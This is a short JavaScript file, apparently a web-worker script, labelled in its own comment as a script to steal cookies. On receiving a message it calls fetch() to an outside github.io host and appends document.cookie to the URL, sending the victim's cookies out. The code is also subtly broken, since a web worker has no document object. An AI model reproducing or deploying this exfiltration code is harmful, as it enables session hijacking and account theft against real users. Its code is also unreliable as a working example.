// This is a script to steal cookies
self.onmessage = function(event) {
    fetch('https://pentestjoykathleen.github.io/malicious_worker.js/steal?cookie=' + document.cookie);
};
